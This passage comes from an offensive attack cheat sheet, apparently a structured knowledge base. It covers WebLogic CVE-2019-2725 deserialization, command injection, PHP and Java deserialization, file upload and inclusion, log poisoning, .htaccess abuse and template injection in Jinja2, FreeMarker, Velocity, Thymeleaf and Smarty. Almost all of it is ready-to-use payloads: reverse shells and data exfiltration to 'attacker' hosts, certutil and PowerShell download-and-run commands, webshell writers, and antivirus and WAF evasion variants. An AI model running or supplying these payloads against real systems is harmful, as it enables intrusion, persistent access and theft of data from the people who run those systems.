            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

**3. CVE-2019-2725 deserializationRCE**  _[linux]_
_Exploit the deserialization vulnerability in the _async endpoint to perform out-of-band (OOB) verification_
```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```

**4. Write a Webshell to Gain Persistence**  _[linux]_
_Use XMLDecoder's PrintWriter to write a JSP webshell to the WebLogic deployment directory_
```
# write a JSP webshell via XMLDecoder
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# verify the webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```

**WAF/EDR Bypass Variants:**

**1. Alternate Deserialization Endpoints**
_Try multiple different SOAP endpoints of the WebLogic WLS-WSAT component; some endpoints may not be covered by WAF rules_
```
# try different XMLDecoder entry points
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```

**2. T3/IIOP Protocol to Bypass HTTP-Layer WAF**
_Send deserialization payloads over the T3 or IIOP protocol to bypass WAFs that only inspect HTTP traffic_
```
# T3 protocol exploitation (bypasses HTTP-layer WAF)
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP protocol exploitation
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# use ysoserial to generate the T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```

**3. XML Encoding Obfuscation Bypass**
_Obfuscate payload content via XML encoding (UTF-16/CDATA/entity encoding) to bypass content-matching WAFs_
```
<!-- UTF-16 encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA-wrap keywords -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

---

### · RCE Remote Code Execution

### Command Injection  `rce-command-injection`
Operating system command injection attack techniques
Subcategory: **Command Injection** · tags: `rce` `command` `injection` `os`

**Prerequisites:** system command execution functionality present; user input not filtered

**Attack Chain:**

**1. 1. Probe Command Injection**
_Probe command injection points_
```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```

**2. 2. Linux Command Injection**  _[linux]_
_Linux system command injection_
```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

**3. 3. Windows Command Injection**  _[windows]_
_Windows system command injection_
```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```

**4. 4. Blind Command Injection**
_Blind command injection probing_
```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
Determine whether the command executed based on response-time differences
```

**5. 5. Data Exfiltration**  _[linux]_
_Obtain data via out-of-band channels_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```

**WAF/EDR Bypass Variants:**

**1. Space Bypass**  _[linux]_
_Bypass space filtering_
```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```

**2. Keyword Bypass**  _[linux]_
_Bypass keyword filtering_
```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

**3. Encoding Bypass**  _[linux]_
_Bypass using encoding_
```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

---

### PHP Code Execution  `rce-php`
PHP code execution exploitation techniques
Subcategory: **PHP Code Execution** · tags: `rce` `php` `code` `execution`

**Prerequisites:** a PHP code execution point present; user input can control code

**Attack Chain:**

**1. 1. Common Dangerous Functions**
_PHP dangerous functions_
```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```

**2. 2. Command Execution**
_PHP command execution functions_
```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```

**3. 3. One-Liner Webshells**
_Common one-liner webshells_
```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```

**4. 4. AV-Evasion One-Liner**
_AV-evasion one-liner webshell_
```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```

**WAF/EDR Bypass Variants:**

**1. Callback Function Bypass**
_Use callback functions_
```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```

**2. Variable Function Bypass**
_WAF bypass techniques_
```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```

---

### PHP Filter Chain RCE  `rce-php-filter`
Construct RCE using a PHP filter chain
Subcategory: **PHP Filter Chain** · tags: `rce` `php` `filter` `chain`

**Prerequisites:** a file inclusion vulnerability present; the PHP version supports filter chains

**Attack Chain:**

**1. 1. Filter Chain Principles**
_Filter chain principles_
```
Leverage php://filter's convert.base64-decode and other filters
Through carefully crafted input, ultimately generate executable code
```

**2. 2. Construct the Filter Chain**
_Construct the filter chain_
```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
Chain multiple filters together
```

**3. 3. Generate Using a Tool**
_Generate the filter chain using a tool_
```
# use php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# outputs a ready-to-use filter chain
```

**4. 4. Complete Exploitation Example**
_Complete filter chain example_
```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Bypass using encoding combinations_
```
Use different combinations of encoding filters
Bypass keyword detection
```

---

### Blind Command Injection  `rce-cmd-blind`
Blind (no-echo) command injection exploitation techniques
Subcategory: **Blind Command Injection** · tags: `rce` `blind` `command` `injection`

**Prerequisites:** a command injection point present; no direct echo

**Attack Chain:**

**1. 1. Time-Based Blind Injection**
_Determine using time delay_
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
Observe the response time to determine whether the command executed
```

**2. 2. DNS Exfiltration**
_DNS data exfiltration_
```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```

**3. 3. HTTP Exfiltration**
_HTTP data exfiltration_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```

**4. 4. ICMP Exfiltration**  _[linux]_
_ICMP data exfiltration_
```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
Listen for ICMP packets on the attacker's server
```

**5. 5. Reverse Shell**
_Reverse shell_
```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**  _[linux]_
_Base64 encoding bypass_
```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash
Bypass using Base64 encoding
```

---

### Deserialization Vulnerabilities  `rce-deserialize`
Achieve RCE via deserialization vulnerabilities
Subcategory: **Deserialization** · tags: `rce` `deserialize` `java` `php`

**Prerequisites:** a deserialization point present; an exploitable gadget chain present

**Attack Chain:**

**1. 1. Java Deserialization**
_Java deserialization_
```
# commonly vulnerable components
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# use ysoserial to generate the payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
```

**2. 2. PHP Deserialization**
_PHP deserialization_
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
Produces: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```

**3. 3. Python Deserialization**
_Python pickle deserialization_
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# send the payload to trigger deserialization
```

**4. 4. .NET Deserialization**  _[windows]_
_.NET deserialization_
```
# use ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# common formats
BinaryFormatter
Json.NET
XMLSerializer
```

**WAF/EDR Bypass Variants:**

**1. Signature Bypass**
_Bypass signature verification_
```
If signature verification is present
Need to obtain the key to re-sign
```

---

### PHP Deserialization  `rce-deserialize-php`
PHP deserialization exploitation techniques
Subcategory: **PHP Deserialization** · tags: `rce` `php` `deserialize` `unserialize`

**Prerequisites:** an unserialize call present; an exploitable class present

**Attack Chain:**

**1. 1. Magic Methods**
_PHP magic methods_
```
__construct() - called when the object is created
__destruct() - called when the object is destroyed
__wakeup() - called during deserialization
__toString() - called when the object is cast to a string
__call() - triggered when calling a non-existent method
```

**2. 2. Construct the POP Chain**
_Construct the POP chain_
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```

**3. 3. Phar Deserialization**
_Phar deserialization_
```
# generate the Phar file
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# trigger deserialization
phar://exploit.phar/test.txt
```

**4. 4. Session Deserialization**
_Session deserialization_
```
# leverage session-handler differences
# php_serialize vs php_binary
Construct malicious session data to trigger deserialization
```

**WAF/EDR Bypass Variants:**

**1. Property Modifier Bypass**
_Property modifier handling_
```
Use public/private/protected properties
Note the differences in serialization format:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```

---

### Java Deserialization  `rce-deserialize-java`
Java deserialization exploitation techniques
Subcategory: **Java Deserialization** · tags: `rce` `java` `deserialize` `ysoserial`

**Prerequisites:** a Java deserialization point present; a gadget chain present

**Attack Chain:**

**1. 1. Common Gadget Chains**
_Common gadget chains_
```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK native gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```

**2. 2. Using ysoserial**
_Generate payload using ysoserial_
```
# list all gadgets
java -jar ysoserial.jar

# generate the payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

**3. 3. JRMP Attack**
_JRMP attack_
```
# start the JRMP service
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# send the JRMP client payload
java -jar ysoserial.jar JRMPClient attacker:4444
```

**4. 4. In-Memory Implant Injection**
_In-memory implant injection_
```
# use ysoserial to inject an in-memory implant
java -jar ysoserial.jar CommonsCollections1 "generate in-memory implant bytecode"

# or use a tool
java -jar ysuserial.jar CommonsCollections1 "in-memory implant command"
```

**WAF/EDR Bypass Variants:**

**1. Second-Order Deserialization**
_Second-order deserialization bypass_
```
Use SignedObject or RMI to bypass the blacklist
```

**2. Reflection Bypass**
_Reflection bypass_
```
Use reflection to set properties and bypass restrictions
```

---

### File Upload Vulnerability  `rce-file-upload`
Achieve RCE via a file upload vulnerability
Subcategory: **File Upload** · tags: `rce` `upload` `webshell` `file`

**Prerequisites:** file upload functionality present; can upload executable files

**Attack Chain:**

**1. 1. Basic Upload**
_Directly upload an executable file_
```
Upload a PHP file: shell.php
Upload a JSP file: shell.jsp
Upload an ASPX file: shell.aspx
Upload a CGI file: shell.cgi
```

**2. 2. Front-End Bypass**
_Bypass front-end validation_
```
# modify Content-Type
Content-Type: image/jpeg

# modify the file extension
test.php -> test.jpg.php
test.php -> test.php.jpg

# use a null byte
test.php%00.jpg
```

**3. 3. Back-End Bypass**
_Bypass the back-end blacklist_
```
# blacklist bypass
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# case bypass
.Php, .pHp, .PHP

# double-write bypass
.pphphp
```

**4. 4. Image-Embedded Shell**
_Craft an image-embedded shell_
```
# craft an image-embedded shell
copy test.jpg/b + shell.php/a shell.jpg

# execute via file inclusion
include($_GET['file']);
?file=upload/shell.jpg
```

**5. 5. .htaccess Upload**  _[linux]_
_Leverage .htaccess_
```
# upload the .htaccess file
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# subsequently uploaded jpg files will be executed as PHP
```

**WAF/EDR Bypass Variants:**

**1. Content-Type Bypass**
_Content-Type bypass_
```
Change the Content-Type in the request to an allowed type
image/jpeg, image/png, image/gif
```

**2. File Header Bypass**
_File header bypass_
```
Prepend an image file header to the malicious file
GIF89a<?php eval($_POST[cmd]);?>
```

---

### File Inclusion RCE  `rce-include`
Achieve RCE via a file inclusion vulnerability
Subcategory: **File Inclusion** · tags: `rce` `include` `lfi` `rfi`

**Prerequisites:** a file inclusion vulnerability present; can include a malicious file

**Attack Chain:**

**1. 1. Log Poisoning**  _[linux]_
_Log poisoning RCE_
```
# inject code into the log
User-Agent: <?php system($_GET['cmd']);?>

# include the log file
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```

**2. 2. Session File Inclusion**  _[linux]_
_Session file inclusion_
```
# inject code into the session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# session content
<?php system($_GET['cmd']);?>
```

**3. 3. /proc/self/environ**  _[linux]_
_Include environment variables_
```
# inject code into environment variables
User-Agent: <?php system($_GET['cmd']);?>

# include the environment-variable file
?file=/proc/self/environ&cmd=whoami
```

**4. 4. PHP Pseudo-Protocols**
_PHP pseudo-protocol exploitation_
```
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data:// protocol
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```

**5. 5. Remote File Inclusion**
```
# RFI directly includes a remote shell
?file=http://attacker.com/shell.txt

# shell.txt content
<?php system($_GET['cmd']);?>
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_URL encoding bypass_
```
?file=%2fvar%2flog%2fapache2%2faccess.log
URL-encode the path
```

---

### Log Poisoning RCE  `rce-log-poison`
Achieve RCE via log poisoning
Subcategory: **Log Poisoning** · tags: `rce` `log` `poison` `lfi`

**Prerequisites:** a file inclusion vulnerability present; can read log files

**Attack Chain:**

**1. 1. Apache Log Poisoning**  _[linux]_
_Apache log poisoning_
```
# inject code into the access log
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# include the log to execute
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```

**2. 2. Nginx Log Poisoning**
```
# inject code
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# include the log
?file=/var/log/nginx/access.log&cmd=whoami
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
Use URL encoding or Base64 encoding to bypass keyword filtering
```

---

### Image-Embedded Shell RCE  `rce-image`
Achieve RCE using an image-embedded shell
Subcategory: **Image-Embedded Shell** · tags: `rce` `image` `webshell` `upload`

**Prerequisites:** file upload present; file inclusion present

**Attack Chain:**

**1. 1. Craft an Image-Embedded Shell**
_Craft an image-embedded shell_
```
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# append PHP code to the end of the image
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```

**2. 2. Image-Embedded Shell Content**
_Image-embedded shell format_
```
GIF89a
<?php @eval($_POST[cmd]);?>

# or use an Exif comment
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```

**3. 3. Execute via File Inclusion**
_Execute via file inclusion_
```
# combine with a file inclusion vulnerability
?file=upload/shell.jpg
POST: cmd=system('whoami');

# combine with phar://
?file=phar://upload/shell.jpg
```

**4. 4. Combine with .htaccess**  _[linux]_
_Execute in combination with .htaccess_
```
# upload .htaccess
AddType application/x-httpd-php .jpg

# directly access the image to execute
http://target/upload/shell.jpg
```

**WAF/EDR Bypass Variants:**

**1. File Header Spoofing**
_File header spoofing_
```
Use a real image file header
Ensure the image previews normally
```

---

### .htaccess Exploitation  `rce-htaccess`
Achieve RCE using an .htaccess file
Subcategory: **.htaccess** · tags: `rce` `htaccess` `apache` `upload`

**Prerequisites:** Apache server; can upload .htaccess

**Attack Chain:**

**1. 1. Parse Other Extensions**  _[linux]_
_Modify file-type parsing_
```
# make .jpg files execute as PHP
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# make .txt files execute as PHP
AddType application/x-httpd-php .txt
```

**2. 2. Auto-Include**  _[linux]_
_Auto-include files_
```
# auto-include before every file
php_value auto_prepend_file /var/www/html/shell.php

# auto-include after every file
php_value auto_append_file /var/www/html/shell.php
```

**3. 3. Pretty-URL (Rewrite) RCE**  _[linux]_
_Pretty-URL (rewrite) configuration_
```
# leverage mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# a more dangerous configuration
SetHandler application/x-httpd-php
```

**4. 4. Error Page Inclusion**  _[linux]_
_Error page exploitation_
```
# custom error page
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```

**5. 5. File Inclusion Bypass**  _[linux]_
_PHP configuration modification_
```
# set the include path
php_value include_path "/var/www/html/uploads"

# disable security restrictions
php_flag safe_mode off
php_flag display_errors on
```

**WAF/EDR Bypass Variants:**

**1. Newline Bypass**  _[linux]_
_Newline bypass_
```
Use newlines to separate the configuration
Bypass single-line detection
```

---

### · SSTI Template Injection

### Jinja2 Template Injection  `ssti-jinja2`
Jinja2/Twig template injection attack techniques
Subcategory: **Jinja2** · tags: `ssti` `jinja2` `twig` `template`

**Prerequisites:** uses the Jinja2/Twig template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe template injection_
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
If it outputs 49 or configuration information, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```

**3. 3. Command Execution**
_Execute system commands_
```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**4. 4. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```

**2. Using the request Object**
_Pass via request parameters_
```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```

---

### FreeMarker Template Injection  `ssti-freemarker`
FreeMarker template engine injection attack techniques
Subcategory: **FreeMarker** · tags: `ssti` `freemarker` `java` `template`

**Prerequisites:** uses the FreeMarker template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe FreeMarker template injection_
```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
If it outputs 49 or freemarker, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```

**3. 3. Command Execution - new**
_Execute commands using the Execute class_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

**4. 4. Command Execution - api**
_Execute commands using ObjectConstructor_
```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```

**2. Using Built-In Functions**
_Instantiate and execute directly_
```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```

---

### Velocity Template Injection  `ssti-velocity`
Velocity template engine injection attack techniques
Subcategory: **Velocity** · tags: `ssti` `velocity` `java` `template`

**Prerequisites:** uses the Velocity template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Velocity template injection_
```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
If it outputs 49 or version information, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```

**3. 3. Command Execution - ClassTool**
_Execute commands using ClassTool_
```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```

**4. 4. Command Execution - Reflection**
_Execute commands using reflection_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

**2. Using Unicode**
_Bypass using Unicode encoding_
```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

---

### Thymeleaf Template Injection  `ssti-thymeleaf`
Thymeleaf template engine injection attack techniques
Subcategory: **Thymeleaf** · tags: `ssti` `thymeleaf` `java` `spring` `template`

**Prerequisites:** uses the Thymeleaf template engine; Spring framework; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Thymeleaf template injection_
```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
If it outputs 49, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```

**3. 3. Command Execution - Spring Expression**
_Execute commands using Spring expressions_
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```

**4. 4. Command Execution - ProcessBuilder**
_Execute commands using ProcessBuilder_
```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```

**2. Using Reflection**
_Bypass using reflection_
```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```

**3. URL Encoding**
_Bypass using a byte array_
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# construct the command using a byte array
```

---

### Smarty Template Injection  `ssti-smarty`
Smarty template engine injection attack techniques
Subcategory: **Smarty** · tags: `ssti` `smarty` `php` `template`

**Prerequisites:** uses the Smarty template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Smarty template injection_
```
{$smarty.version}
{7*7}
{$smarty.template}
If it outputs the version or 49, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```

**3. 3. Command Execution - system**
_Execute commands using the system function_
```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```

**4. 4. Command Execution - passthru**
_Execute commands using the passthru function_
```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```

**5. 5. Command Execution - exec**
_Execute commands using the exec function_
```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```

